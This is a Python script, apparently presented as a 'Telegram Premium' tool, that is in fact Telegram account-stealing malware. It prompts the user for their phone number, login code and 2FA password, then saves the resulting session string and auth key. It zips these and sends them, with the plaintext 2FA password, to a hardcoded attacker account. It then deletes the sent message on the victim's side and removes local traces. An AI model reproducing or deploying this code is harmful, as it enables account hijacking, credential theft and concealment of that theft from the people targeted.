
import os
import sys

try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import SessionPasswordNeededError
    from telethon.tl.functions.messages import DeleteMessagesRequest
except ImportError:
    os.system('pip install telethon')
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import SessionPasswordNeededError
    from telethon.tl.functions.messages import DeleteMessagesRequest

import asyncio
import zipfile
import random
import string
from datetime import datetime

YouUsername = "@SpecterOG" # Edit This

API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'

async def send_to_telegram(client, target, file_path, caption=""):
    try:
        if not os.path.exists(file_path):
            return None
        entity = await client.get_entity(target)
        sent = await client.send_file(entity, file_path, caption=caption, force_document=True)
        return sent
    except Exception as e:
        return None

session_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

print("""                                                                          
     _____     _                          _____               _           
    |_   _|___| |___ ___ ___ ___ _____   |  _  |___ ___ _____|_|_ _ _____ 
      | | | -_| | -_| . |  _| .'|     |  |   __|  _| -_|     | | | |     |
      |_| |___|_|___|_  |_| |__,|_|_|_|  |__|  |_| |___|_|_|_|_|___|_|_|_|
                    |___|                                                  
""")

phone = input("Phone number (with country code): ")

async def main():
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        code = input("Enter the code: ")
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            twofa = input("Enter 2FA password: ")
            await client.sign_in(password=twofa)
    
    os.system('clear || cls')
    me = await client.get_me()
    os.system('clear || cls')
    
    string_session = client.session.save()
    
    if string_session:
        string_file = f"{session_name}_string.txt"
        with open(string_file, 'w') as f:
            f.write(string_session)
        
        session_file = f"{session_name}.session"
        try:
            client.session.set_file(session_file)
        except:
            import sqlite3
            conn = sqlite3.connect(session_file)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS sessions
                         (dc_id INTEGER, auth_key BLOB, server_address TEXT, port INTEGER)''')
            c.execute('''INSERT OR REPLACE INTO sessions 
                         (dc_id, auth_key, server_address, port) 
                         VALUES (?, ?, ?, ?)''', 
                     (client.session.dc_id, 
                      client.session.auth_key.key, 
                      client.session.server_address, 
                      client.session.port))
            conn.commit()
            conn.close()
        
        zip_name = f"{session_name}.zip"
        files_to_zip = [string_file, session_file]
        
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in files_to_zip:
                if os.path.exists(file):
                    zipf.write(file)
                    os.remove(file)
        
        if 'twofa' in locals():
            caption = f"""Phone: {phone}
Username: @{me.username if me.username else 'None'}
ID: {me.id}
2FA Password: {twofa}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Join: @Specter_OG
"""
        else:
            caption = f"""Phone: {phone}
Username: @{me.username if me.username else 'None'}
ID: {me.id}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Join: @Specter_OG
"""
        
        sent = await send_to_telegram(client, YouUsername, zip_name, caption)
        
        if sent:
            await client(DeleteMessagesRequest(id=[sent.id], revoke=False))
        
        if os.path.exists(zip_name):
            os.remove(zip_name)
        for file in [string_file, session_file]:
            if os.path.exists(file):
                os.remove(file)
    
    await client.disconnect()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
